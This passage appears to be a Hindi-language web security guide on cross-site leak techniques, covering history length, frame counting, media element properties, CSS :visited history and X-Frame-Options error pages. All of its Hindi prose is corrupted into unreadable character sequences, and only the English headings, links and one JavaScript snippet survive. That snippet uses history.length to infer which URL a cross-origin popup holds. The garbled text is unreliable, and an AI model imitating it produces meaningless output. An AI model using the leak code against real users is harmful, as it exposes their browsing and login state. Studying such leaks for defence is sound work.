**`history.length`** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдПрдХ рдкреГрд╖реНрда рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рдирд╛, **рдЗрд╕реЗ рд╡рд╛рдкрд╕** рдЙрд╕реА рдореВрд▓ рдкрд░ **рдмрджрд▓рдирд╛** рдФрд░ **`history.length`** рдХреЗ рдирдП рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ред

### History Length with same URL

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: рдпрджрд┐ URL рдЕрдиреБрдорд╛рдирд┐рдд URL рдХреЗ рд╕рдорд╛рди рд╣реИ
* **Summary:** рдпрд╣ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдлреНрд░реЗрдо/рдкреЙрдк-рдЕрдк рдХрд╛ рд╕реНрдерд╛рди рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ URL рдореЗрдВ рд╣реИ, рдЗрддрд┐рд╣рд╛рд╕ рдХреА рд▓рдВрдмрд╛рдИ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗред
* **Code Example**: рдиреАрдЪреЗ

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ JavaScript рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдлреНрд░реЗрдо/рдкреЙрдк-рдЕрдк рд╕реНрдерд╛рди рдХреЛ рдЕрдиреБрдорд╛рдирд┐рдд URL рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ **рддреБрд░рдВрдд** **рдЗрд╕реЗ `about:blank` рдореЗрдВ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рдЗрддрд┐рд╣рд╛рд╕ рдХреА рд▓рдВрдмрд╛рдИ рдмрдврд╝ рдЧрдИ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ URL рд╕рд╣реА рдерд╛ рдФрд░ рдЗрд╕реЗ **рдмрдврд╝рдиреЗ рдХрд╛ рд╕рдордп рдорд┐рд▓рд╛** рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ URL рд╡рд╣реА рд╣реИ рддреЛ рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рд▓реЛрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ред рдпрджрд┐ рдпрд╣ рдирд╣реАрдВ рдмрдврд╝рд╛, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ **рдЕрдиреБрдорд╛рдирд┐рдд URL рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЧрдИ** рдереА, рд▓реЗрдХрд┐рди рдХреНрдпреЛрдВрдХрд┐ рд╣рдо **рддреБрд░рдВрдд рдмрд╛рдж рдореЗрдВ** **`about:blank`** рд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, **рдЗрддрд┐рд╣рд╛рд╕ рдХреА рд▓рдВрдмрд╛рдИ рдХрднреА рдирд╣реАрдВ рдмрдврд╝реА** рдЬрдм рдЕрдиреБрдорд╛рдирд┐рдд URL рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ред
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** `window.length` рдкреНрд░реЙрдкрд░реНрдЯреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ iframe рддрддреНрд╡реЛрдВ рдХреА рдорд╛рддреНрд░рд╛ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░реЗрдВред
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` рдпрд╛ `window.open` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦреЛрд▓реЗ рдЧрдП **рд╡реЗрдм рдореЗрдВ рдлреНрд░реЗрдо рдХреА рд╕рдВрдЦреНрдпрд╛** рдХреА рдЧрдгрдирд╛ рдХрд░рдирд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдкреГрд╖реНрда рдореЗрдВ рд╣рдореЗрд╢рд╛ рд╕рдорд╛рди рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ рдлреНрд░реЗрдо рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдлреНрд░реЗрдо рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреА **рдирд┐рд░рдВрддрд░** рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рдПрдХ **рдкреИрдЯрд░реНрди** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдХреНрд░реЛрдо рдореЗрдВ, рдПрдХ **PDF** рдХреЛ **рдлреНрд░реЗрдо рдЧрд┐рдирддреА** рдХреЗ рд╕рд╛рде **рдкрддрд╛ рд▓рдЧрд╛рдпрд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ `embed` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреБрдЫ рдХрдВрдЯреЗрдВрдЯ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) рд╣реИрдВ рдЬреИрд╕реЗ `zoom`, `view`, `page`, `toolbar` рдЬрд╣рд╛рдВ рдпрд╣ рддрдХрдиреАрдХ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддреА рд╣реИред

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** 2 рд╕рдВрднрд╛рд╡рд┐рдд рд░рд╛рдЬреНрдпреЛрдВ рдХреЗ рдмреАрдЪ рднреЗрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реАрдХ рдХрд┐рдП рдЧрдП рдорд╛рди рдХреЛ рдкрдврд╝реЗрдВ
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML рддрддреНрд╡реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рд▓реАрдХ рд╣реЛрдирд╛ рд╡реЗрдм рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдПрдХ рдЪрд┐рдВрддрд╛ рдХрд╛ рд╡рд┐рд╖рдп рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЧрддрд┐рд╢реАрд▓ рдореАрдбрд┐рдпрд╛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЙрддреНрдкрдиреНрди рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдпрд╛ рдЬрдм рд╡реЙрдЯрд░рдорд╛рд░реНрдХ рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдореАрдбрд┐рдпрд╛ рдХрд╛ рдЖрдХрд╛рд░ рдмрджрд▓рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░рд╛рдЬреНрдпреЛрдВ рдХреЗ рдмреАрдЪ рднреЗрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВред

### Information Exposed by HTML Elements

* **HTMLMediaElement**: рдпрд╣ рддрддреНрд╡ рдореАрдбрд┐рдпрд╛ рдХреА `duration` рдФрд░ `buffered` рд╕рдордп рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЗрд╕рдХреЗ API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [HTMLMediaElement рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: рдпрд╣ `videoHeight` рдФрд░ `videoWidth` рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, рдФрд░ `webkitDecodedFrameCount` рдЬреИрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ, рдЬреЛ рдореАрдбрд┐рдпрд╛ рд╕рд╛рдордЧреНрд░реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЧрд╣рди рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред [HTMLVideoElement рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рд╡реАрдбрд┐рдпреЛ рдкреНрд▓реЗрдмреИрдХ рдЧреБрдгрд╡рддреНрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `totalVideoFrames` рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рд╡реАрдбрд┐рдпреЛ рдбреЗрдЯрд╛ рдХреА рдорд╛рддреНрд░рд╛ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред [getVideoPlaybackQuality() рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: рдпрд╣ рддрддреНрд╡ рдПрдХ рдЫрд╡рд┐ рдХреА `height` рдФрд░ `width` рдХреЛ рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ рдПрдХ рдЫрд╡рд┐ рдЕрдорд╛рдиреНрдп рд╣реИ, рддреЛ рдпреЗ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ 0 рд▓реМрдЯрд╛рдПрдВрдЧреА, рдФрд░ `image.decode()` рдлрд╝рдВрдХреНрд╢рди рдЕрд╕реНрд╡реАрдХреГрдд рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЫрд╡рд┐ рдХреЛ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓рддрд╛ рд╣реБрдИред [HTMLImageElement рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдпрд╛ рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВред
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди CSS рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **HTML рд▓рд┐рдВрдХ рддрддреНрд╡** рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛рд╡рд░ рдкреГрд╖реНрда рдкрд░ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ **рдирд┐рдпрдо** рд╣рдорд▓рд╛рд╡рд░ рдкреГрд╖реНрда рдкрд░ **рд▓рд╛рдЧреВ** рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред рдпрджрд┐ рдПрдХ рдкреГрд╖реНрда рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдЗрди рдирд┐рдпрдореЛрдВ рдХреЛ рдмрджрд▓рддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЗрди **рднрд┐рдиреНрдирддрд╛рдУрдВ** рдХрд╛ **рдкрддрд╛ рд▓рдЧрд╛** рд╕рдХрддрд╛ рд╣реИред\
рдПрдХ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ `window.getComputedStyle` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ HTML рддрддреНрд╡ рдХреА **CSS** рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдХреЛ **рдкрдврд╝** рд╕рдХрддрд╛ рд╣реИред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдпрджрд┐ рдкреНрд░рднрд╛рд╡рд┐рдд рддрддреНрд╡ рдФрд░ рдкреНрд░реЙрдкрд░реНрдЯреА рдХрд╛ рдирд╛рдо рдЬреНрдЮрд╛рдд рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдордирдорд╛рдиреЗ CSS рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдХреЛ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИред

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** рдпрд╣ рдкрд╣рдЪрд╛рдиреЗрдВ рдХрд┐ рдХреНрдпрд╛ `:visited` рд╢реИрд▓реА рдПрдХ URL рдкрд░ рд▓рд╛рдЧреВ рд╣реИ, рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╣реА рджреЗрдЦрд╛ рдЧрдпрд╛ рдерд╛
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**рдпрд╣рд╛рдБ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ рд╣реЗрдбрд▓реЗрд╕ рдХреНрд░реЛрдо рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред
{% endhint %}

CSS `:visited` рдЪрдпрдирдХрд░реНрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ URLs рдХреЛ рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╕реЗ рд╕реНрдЯрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрджрд┐ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд╣рд▓реЗ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реЛред рдкрд╣рд▓реЗ, `getComputedStyle()` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрди рд╕реНрдЯрд╛рдЗрд▓ рднрд┐рдиреНрдирддрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЖрдзреБрдирд┐рдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдиреЗ рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ рд▓рд┐рдВрдХ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд▓рд╛рдЧреВ рдХрд┐рдП рд╣реИрдВред рдЗрди рдЙрдкрд╛рдпреЛрдВ рдореЗрдВ рд╣рдореЗрд╢рд╛ рдпрд╣ рд▓реМрдЯрд╛рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдХрд┐ рдЬреИрд╕реЗ рд▓рд┐рдВрдХ рдХреЛ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реЛ рдФрд░ `:visited` рдЪрдпрдирдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рд╢реИрд▓рд┐рдпреЛрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред

рдЗрди рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдпрд╣ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рд▓рд┐рдВрдХ рдХреА рджреЗрдЦреА рдЧрдИ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИред рдПрдХ рддрдХрдиреАрдХ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ CSS рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХреНрд╖реЗрддреНрд░ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `mix-blend-mode` рдкреНрд░реЙрдкрд░реНрдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред рдпрд╣ рдкреНрд░реЙрдкрд░реНрдЯреА рддрддреНрд╡реЛрдВ рдХреЛ рдЙрдирдХреЗ рдкреГрд╖реНрдарднреВрдорд┐ рдХреЗ рд╕рд╛рде рдорд┐рд╢реНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдмрд╛рддрдЪреАрдд рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рджреЗрдЦреА рдЧрдИ рд╕реНрдерд┐рддрд┐ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддреА рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд▓рд┐рдВрдХ рдХреЗ рд░реЗрдВрдбрд░рд┐рдВрдЧ рд╕рдордп рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдмрд╛рддрдЪреАрдд рдХреЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреЗрдЦреЗ рдЧрдП рдФрд░ рди рджреЗрдЦреЗ рдЧрдП рд▓рд┐рдВрдХ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╕реЗ рд░реЗрдВрдбрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд╕реЗ рд░реЗрдВрдбрд░рд┐рдВрдЧ рдореЗрдВ рдорд╛рдкрдиреЗ рдпреЛрдЧреНрдп рд╕рдордп рдХрд╛ рдЕрдВрддрд░ рдЖ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдкреНрд░рдорд╛рдгрд┐рдд рдЕрд╡рдзрд╛рд░рдгрд╛ (PoC) рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдПрдХ рдХреНрд░реЛрдорд┐рдпрдо рдмрдЧ рд░рд┐рдкреЛрд░реНрдЯ рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬреЛ рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдХрдИ рд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдордп рдХреЗ рдЕрдВрддрд░ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рджреЗрдЦреА рдЧрдИ рд╕реНрдерд┐рддрд┐ рдХреЛ рд╕рдордп рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрди рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдФрд░ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП, рдЙрдирдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреГрд╖реНрдареЛрдВ рдкрд░ рдЬрд╛рдПрдБ:

* `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** Google Chrome рдореЗрдВ, рдЬрдм рдПрдХ рдкреГрд╖реНрда рдХреЛ X-Frame-Options рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдХрд╛рд░рдг рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рд╛рдЗрдЯ рдкрд░ рдПрдореНрдмреЗрдб рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╕рдорд░реНрдкрд┐рдд рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

рдХреНрд░реЛрдо рдореЗрдВ, рдпрджрд┐ `X-Frame-Options` рд╣реЗрдбрд░ "deny" рдпрд╛ "same-origin" рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред рдХреНрд░реЛрдо рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ `contentDocument` рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЗ рд▓рд┐рдП рдПрдХ рдЦрд╛рд▓реА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдСрдмреНрдЬреЗрдХреНрдЯ (null рдХреЗ рдмрдЬрд╛рдп) рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХрд┐ iframe рдпрд╛ рдЕрдиреНрдп рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рд▓рд╛рдн 